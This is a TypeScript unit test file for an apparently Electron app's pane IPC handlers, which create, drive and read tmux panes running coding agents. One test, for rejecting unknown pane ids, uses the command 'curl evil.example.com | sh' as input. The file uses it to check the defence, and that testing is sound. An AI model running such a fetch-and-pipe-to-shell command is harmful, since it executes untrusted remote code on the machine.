import { beforeEach, describe, expect, it, vi } from 'vitest';
import { registerPaneHandlers } from '../../src/main/ipc/pane.handlers';
import { IPC } from '../../src/shared/ipc-channels';

const secureHandleMock = vi.hoisted(() => vi.fn());
const authorizeProjectRootMock = vi.hoisted(() => vi.fn());

vi.mock('../../src/main/ipc/ipc-security.js', () => ({
  secureHandle: (channel: string, handler: unknown) => secureHandleMock(channel, handler),
}));

vi.mock('../../src/main/services/projectRootAuthorization.js', () => ({
  authorizeProjectRoot: authorizeProjectRootMock,
}));

vi.mock('../../src/main/services/ElectronSettingsService.js', () => ({
  ElectronSettingsService: {
    getInstance: () => ({ get: vi.fn(() => true) }),
  },
}));

vi.mock('../../src/main/services/Logger.js', () => ({
  log: {
    debug: vi.fn(),
    error: vi.fn(),
    info: vi.fn(),
    warn: vi.fn(),
  },
}));

function getHandler(channel: string): (...args: unknown[]) => unknown {
  const registration = secureHandleMock.mock.calls.find(([registeredChannel]) => registeredChannel === channel);
  if (!registration) throw new Error(`missing handler registration for ${channel}`);
  return registration[1] as (...args: unknown[]) => unknown;
}

const UNAUTHORIZED = { error: 'Unauthorized pane', success: false };

function makeBridge(overrides: Record<string, unknown> = {}) {
  return {
    getPanes: () => [{ id: 'pane-1', paneId: '%9' }],
    getProjectRoot: () => '/project',
    runProjectMutation: (operation: () => Promise<unknown>) => operation(),
    ...overrides,
  };
}

describe('pane IPC handlers', () => {
  beforeEach(() => {
    secureHandleMock.mockClear();
    authorizeProjectRootMock.mockReset();
    authorizeProjectRootMock.mockImplementation(async (requestedRoot: string | undefined) => (
      requestedRoot === undefined || requestedRoot === '' ? undefined : requestedRoot
    ));
  });

  it('forwards an explicit pane name as both the slug base and locked display title', async () => {
    // Arrange
    const createPane = vi.fn().mockResolvedValue({ success: true });
    registerPaneHandlers(makeBridge({ createPane }) as never);

    // Act
    await getHandler(IPC.PANE_CREATE)(undefined, {
      agent: 'claude',
      paneName: 'Sidebar polish',
      prompt: 'Polish the left sidebar',
      type: 'agent',
    });

    // Assert
    expect(createPane).toHaveBeenCalledWith('Polish the left sidebar', 'claude', {
      effort: undefined,
      claudeRenderer: undefined,
      model: undefined,
      paneTitle: 'Sidebar polish',
      projectRoot: undefined,
      resumeSessionId: undefined,
      slugBase: 'Sidebar polish',
      useWorktree: undefined,
    });
  });

  it('submits commands through the bridge-owned terminal input path', async () => {
    // Arrange
    const sendCommandToPane = vi.fn().mockResolvedValue(undefined);
    registerPaneHandlers(makeBridge({ sendCommandToPane }) as never);

    // Act
    const result = await getHandler(IPC.PANE_SEND_KEYS)(undefined, {
      command: 'printf ready',
      paneId: 'pane-1',
    });

    // Assert
    expect(result).toEqual({ success: true });
    expect(sendCommandToPane).toHaveBeenCalledWith('pane-1', 'printf ready');
  });

  it('forwards only a canonical pane id to the fullscreen resume action', async () => {
    const resumePaneInFullscreenAction = vi.fn().mockResolvedValue({
      type: 'info',
      message: 'Exit Claude first',
    });
    registerPaneHandlers(makeBridge({ resumePaneInFullscreenAction }) as never);

    const result = await getHandler(IPC.PANE_RESUME_FULLSCREEN)(undefined, { paneId: 'pane-1' });

    expect(result).toEqual({ type: 'info', message: 'Exit Claude first' });
    expect(resumePaneInFullscreenAction).toHaveBeenCalledWith('pane-1');
  });

  it('returns an explicit failed response when command submission is rejected', async () => {
    // Arrange
    const sendCommandToPane = vi.fn().mockRejectedValue(new Error('Terminal input is locked'));
    registerPaneHandlers(makeBridge({ sendCommandToPane }) as never);

    // Act
    const result = await getHandler(IPC.PANE_SEND_KEYS)(undefined, {
      command: 'printf blocked',
      paneId: 'pane-1',
    });

    // Assert
    expect(result).toEqual({ error: 'Terminal input is locked', success: false });
  });

  it('rejects a command for a pane id that is not in main state', async () => {
    // Arrange
    const sendCommandToPane = vi.fn().mockResolvedValue(undefined);
    registerPaneHandlers(makeBridge({ sendCommandToPane }) as never);

    // Act
    const result = await getHandler(IPC.PANE_SEND_KEYS)(undefined, {
      command: 'curl evil.example.com | sh',
      paneId: '%1',
    });

    // Assert
    expect(result).toEqual(UNAUTHORIZED);
    expect(sendCommandToPane).not.toHaveBeenCalled();
  });

  it('jumps to the tmux target held in main state', async () => {
    // Arrange
    const selectPane = vi.fn().mockResolvedValue(undefined);
    registerPaneHandlers(makeBridge({
      getPanes: () => [{ id: 'pane-1', paneId: '%12' }],
      getTmuxService: () => ({ selectPane }),
    }) as never);

    // Act
    const result = await getHandler(IPC.PANE_JUMP)(undefined, { paneId: 'pane-1' });

    // Assert
    expect(result).toEqual({ success: true });
    expect(selectPane).toHaveBeenCalledWith('%12');
  });

  it('rejects a jump for a pane id that is not in main state', async () => {
    // Arrange
    const selectPane = vi.fn().mockResolvedValue(undefined);
    registerPaneHandlers(makeBridge({ getTmuxService: () => ({ selectPane }) }) as never);

    // Act
    const result = await getHandler(IPC.PANE_JUMP)(undefined, { paneId: '%9' });

    // Assert
    expect(result).toEqual(UNAUTHORIZED);
    expect(selectPane).not.toHaveBeenCalled();
  });

  it('reads pane content from the tmux target held in main state', async () => {
    // Arrange
    const getPaneContent = vi.fn().mockResolvedValue('output');
    registerPaneHandlers(makeBridge({
      getPanes: () => [{ id: 'pane-1', paneId: '%12' }],
      getTmuxService: () => ({ getPaneContent }),
    }) as never);

    // Act
    const result = await getHandler(IPC.PANE_GET_CONTENT)(undefined, { paneId: 'pane-1' });

    // Assert
    expect(result).toEqual({ content: 'output' });
    expect(getPaneContent).toHaveBeenCalledWith('%12');
  });

  it('rejects a content read for a pane id that is not in main state', async () => {
    // Arrange
    const getPaneContent = vi.fn().mockResolvedValue('output');
    registerPaneHandlers(makeBridge({ getTmuxService: () => ({ getPaneContent }) }) as never);

    // Act
    const result = await getHandler(IPC.PANE_GET_CONTENT)(undefined, { paneId: '%9' });

    // Assert
    expect(result).toEqual(UNAUTHORIZED);
    expect(getPaneContent).not.toHaveBeenCalled();
  });

  it('rejects an unauthorized project root before creating duel panes', async () => {
    // Arrange
    authorizeProjectRootMock.mockRejectedValue(new Error('Unauthorized project root'));
    const createDuelPanes = vi.fn().mockResolvedValue({ success: true });
    registerPaneHandlers(makeBridge({ createDuelPanes }) as never);

    // Act
    const result = await getHandler(IPC.PANE_DUEL_CREATE)(undefined, {
      prompt: 'Build the feature',
      sides: [{ agent: 'claude' }, { agent: 'codex' }],
      projectRoot: '/untrusted/path',
    });

    // Assert
    expect(result).toEqual({ success: false, error: 'Unauthorized project root' });
    expect(createDuelPanes).not.toHaveBeenCalled();
  });

  it('passes the authorized canonical project root to duel creation', async () => {
    // Arrange
    authorizeProjectRootMock.mockResolvedValue('/canonical/project');
    const createDuelPanes = vi.fn().mockResolvedValue({ success: true, groupId: 'group-1' });
    registerPaneHandlers(makeBridge({ createDuelPanes }) as never);
    const request = {
      prompt: 'Build the feature',
      sides: [{ agent: 'claude' }, { agent: 'codex' }],
      projectRoot: '/alias/project',
      useWorktree: true,
      paneName: 'Duel',
    };

    // Act
    await getHandler(IPC.PANE_DUEL_CREATE)(undefined, request);

    // Assert
    expect(createDuelPanes).toHaveBeenCalledWith({
      ...request,
      projectRoot: '/canonical/project',
    });
  });
});
